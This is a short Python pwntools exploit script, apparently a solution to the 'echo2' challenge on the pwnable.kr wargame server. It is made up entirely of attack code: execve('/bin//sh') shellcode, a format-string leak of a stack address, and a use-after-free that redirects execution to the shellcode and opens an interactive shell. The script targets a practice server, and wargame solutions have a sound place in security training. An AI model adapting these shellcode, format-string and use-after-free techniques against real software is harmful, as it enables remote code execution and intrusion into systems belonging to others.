from pwn import *

sh2 =asm('''
		mov rdx, 0x68732f2f6e69622f
		push 0
		push rdx
		push rsp
		pop rdi
		push SYS_execve
		pop rax
		xor rdx,rdx #important
		syscall
	   	''', arch='amd64', os='linux')

# fsb
r = remote('pwnable.kr', 9011)
#r = process('./echo2')
r.recvuntil(' : ')
r.sendline(sh2)
r.recvuntil('>')
r.sendline('2')
r.recvline()
r.sendline('%10$pA')
r.recvuntil('0x')
name = int(r.recvuntil('A')[:-1], 16) - 0x20
print hex(name)

# uaf
r.recvuntil('>')
r.sendline('4')
r.recvuntil(')')
r.sendline('n')
r.recvuntil('>')
r.sendline('3')
r.sendline('a'*24+p64(name))
r.interactive()

